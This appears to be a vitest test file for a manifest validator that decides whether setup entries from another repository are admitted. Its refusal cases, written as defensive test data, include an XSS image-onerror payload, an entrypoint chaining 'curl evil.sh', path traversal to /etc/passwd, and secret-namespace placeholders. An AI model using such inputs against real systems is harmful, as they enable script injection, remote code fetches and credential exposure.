import { describe, expect, it } from "vitest";
import { validateSetupEntry } from "#/manifests/manifest-validation";
import type { SetupForm } from "#/manifests/types";
import {
  createSetup,
  createSetupEntry,
  createSetupEntryWith,
} from "./manifest-test-data";

/**
 * The published form with one field's declaration replaced wholesale, so a
 * case can state a key the host's own types do not admit. Admission is a trust
 * boundary over data from another repository, and that data is not typed.
 */
function formWithField(
  name: string,
  field: Record<string, unknown>,
): SetupForm {
  const { form } = createSetup();
  return { ...form, args: { ...form.args, [name]: field } } as SetupForm;
}

describe("validateSetupEntry", () => {
  it("admits a well-formed manifest", () => {
    // Arrange
    const entry = createSetupEntry({ version: "1.0.0" });

    // Act
    const result = validateSetupEntry(entry);

    // Assert
    expect(result).toEqual({ valid: true, errors: [] });
  });

  it("admits a direct entry carrying a fallback-conversation message", () => {
    // Arrange — the seed for the conversation offered when the deployment
    // cannot run the direct path.
    const entry = createSetupEntry({
      setup: createSetup({
        message: "Set this up in a conversation instead.",
      }),
    });

    // Act
    const result = validateSetupEntry(entry);

    // Assert
    expect(result).toEqual({ valid: true, errors: [] });
  });

  // A catalog may publish an entry ahead of its stable release. The version is
  // forwarded as provenance, not compared, so a pre-release or build suffix is
  // a version this host admits rather than a reason to drop the entry.
  it.each(["1.0.0-beta.1", "1.0.0+build.5", "2.1.0-rc.1+build.5"])(
    "admits the template version %s",
    (version) => {
      // Arrange
      const entry = createSetupEntry({ version });

      // Act
      const result = validateSetupEntry(entry);

      // Assert
      expect(result).toEqual({ valid: true, errors: [] });
    },
  );

  // Each case is a separate invariant the host enforces on data authored in
  // another repository. A manifest that trips any of them must not render.
  it.each([
    [
      "a setup version this host cannot interpret",
      { setup: createSetup({ version: "2.0" as "1.0" }) },
    ],
    [
      "markup inside user-visible copy",
      { description: "<img src=x onerror=alert(1)>" },
    ],
    [
      "a placeholder namespace the host does not expose",
      { setup: createSetup({ prompt: "Use {{secrets.githubToken}}." }) },
    ],
    [
      // A direct entry may carry a fallback-conversation seed, but it is still
      // copy, held to the same injection rules as an assisted message.
      "markup inside a direct entry's fallback message",
      { setup: createSetup({ message: "<img src=x onerror=alert(1)>" }) },
    ],
    [
      // A direct entry may seed a fallback conversation, but the message stays
      // setup context only, so the cap still refuses a runaway one.
      "a fallback message that exceeds the setup-context cap",
      { setup: createSetup({ message: "x".repeat(2001) }) },
    ],
    [
      // The version is sent to the service as template provenance, so a
      // malformed one is refused rather than forwarded.
      "a template version that is not semver",
      { version: "v1" },
    ],
    [
      // The host reads one trigger kind to build the request, so a second one
      // would be silently dropped rather than refused.
      "more trigger kinds than the host can send",
      {
        setup: createSetup({
          form: {
            triggers: {
              cron: {
                schedule: {
                  type: "cron",
                  label: "Frequency",
                  help: "How often.",
                  required: true,
                },
              },
              event: {
                on: {
                  type: "select",
                  label: "Respond to",
                  help: "Which event.",
                  required: true,
                  options: [{ value: "push", label: "Push" }],
                },
              },
            },
            args: {
              repository: {
                type: "repo-picker",
                label: "Repository",
                help: "Which repository.",
                provider: "github",
                required: true,
              },
            },
          },
        }),
      },
    ],
    [
      // An event trigger's source is read off the repository field's provider.
      "an event trigger with no repository field to take its source from",
      {
        setup: createSetup({
          form: {
            triggers: {
              event: {
                on: {
                  type: "select",
                  label: "Respond to",
                  help: "Which event.",
                  required: true,
                  options: [{ value: "push", label: "Push" }],
                },
              },
            },
            args: {
              widgetName: {
                type: "text",
                label: "Widget name",
                help: "What to call it.",
                required: true,
              },
            },
          },
          filter: "icontains(body, '{{form.widgetName}}')",
        }),
      },
    ],
    [
      // Both halves merge into one value map, so a repeat would shadow a field
      // and misaddress every error reported against it.
      "a field name declared in both halves of the form",
      {
        setup: createSetup({
          form: {
            triggers: {
              cron: {
                repository: {
                  type: "text",
                  label: "Repository",
                  help: "Shadows the argument below.",
                  required: true,
                },
              },
            },
            args: {
              repository: {
                type: "repo-picker",
                label: "Repository",
                help: "Which repository to watch.",
                provider: "github",
                required: true,
              },
            },
          },
        }),
      },
    ],
  ])("refuses %s", (_case, overrides) => {
    // Arrange
    const candidate = createSetupEntryWith(overrides);

    // Act
    const result = validateSetupEntry(candidate);

    // Assert
    expect(result.valid).toBe(false);
  });

  const bundle = {
    version: "1.0.0",
    entrypoint: "python3 main.py",
    files: { "main.py": "skills/widget-monitor/scripts/main.py" },
    config: { repos: ["{{form.repository}}"] },
  };

  it("admits a direct entry that ships a bundle instead of a prompt", () => {
    // Arrange
    const entry = createSetupEntry({
      setup: createSetup({ prompt: undefined, bundle }),
    });

    // Act
    const result = validateSetupEntry(entry);

    // Assert
    expect(result).toEqual({ valid: true, errors: [] });
  });

  // A bundle is the one part of a manifest naming files and a command this
  // host acts on, so each of these would be acted on if it were admitted.
  it.each([
    [
      "a direct entry declaring both a prompt and a bundle",
      { setup: createSetup({ bundle }) },
    ],
    [
      "a direct entry declaring neither",
      { setup: createSetup({ prompt: undefined }) },
    ],
    [
      "an assisted entry carrying a bundle",
      {
        setup: createSetup({
          mode: "assisted" as const,
          prompt: undefined,
          form: { args: createSetup().form.args },
          message: "Set this up in a conversation.",
          bundle,
        }),
      },
    ],
    [
      "an entrypoint carrying a shell metacharacter",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, entrypoint: "python3 main.py && curl evil.sh" },
        }),
      },
    ],
    [
      "a packed path that escapes the archive",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: {
            ...bundle,
            files: { "../main.py": "skills/widget-monitor/scripts/main.py" },
          },
        }),
      },
    ],
    [
      "a source outside skills/ and automations/",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, files: { "main.py": "../../etc/passwd" } },
        }),
      },
    ],
    [
      "a config placeholder in an unknown namespace",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, config: { token: "{{secrets.github}}" } },
        }),
      },
    ],
    [
      "a bundle version that is not a semantic version",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, version: "latest" },
        }),
      },
    ],
    [
      "an entrypoint that climbs out of the archive",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, entrypoint: "python3 ../../etc/x.py" },
        }),
      },
    ],
    [
      "an entrypoint naming an absolute path",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, entrypoint: "/bin/sh setup.sh" },
        }),
      },
    ],
    [
      "an entrypoint of nothing but spaces",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, entrypoint: "   " },
        }),
      },
    ],
    [
      "a packed path claiming the rendered config's own name",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: {
            ...bundle,
            files: {
              ...bundle.files,
              "config.json": "skills/widget-monitor/scripts/config.json",
            },
          },
        }),
      },
    ],
    [
      "a setup script the bundle does not pack",
      {
        setup: createSetup({
          prompt: undefined,
          bundle: { ...bundle, setupScript: "not-packed.sh" },
        }),
      },
    ],
    [
      "a multi-value declaration on a field that is not a repository picker",
      {
        setup: createSetup({
          form: formWithField("widgetName", {
            type: "text",
            label: "Widget name",
            help: "What to call it.",
            required: true,
            multiple: true,
          }),
        }),
      },
    ],
    [
      "a multi-value declaration that is not true",
      {
        setup: createSetup({
          form: formWithField("repository", {
            type: "repo-picker",
            label: "Repository",
            help: "Which repositories to watch.",
            provider: "github",
            required: true,
            multiple: "banana",
          }),
        }),
      },
    ],
  ])("refuses %s", (_case, overrides) => {
    // Act
    const result = validateSetupEntry(createSetupEntry(overrides));

    // Assert
    expect(result.valid).toBe(false);
  });

  it("admits a repository field that collects several repositories", () => {
    // Arrange
    const entry = createSetupEntry({
      setup: createSetup({
        form: formWithField("repository", {
          type: "repo-picker",
          label: "Repositories",
          help: "Which repositories to watch.",
          provider: "github",
          required: true,
          multiple: true,
        }),
      }),
    });

    // Act
    const result = validateSetupEntry(entry);

    // Assert
    expect(result).toEqual({ valid: true, errors: [] });
  });

  it("reports every problem at once so an author sees the whole picture", () => {
    // Arrange
    const candidate = createSetupEntryWith({ name: "", description: "" });

    // Act
    const { errors } = validateSetupEntry(candidate);

    // Assert
    expect(errors).toHaveLength(2);
  });
});
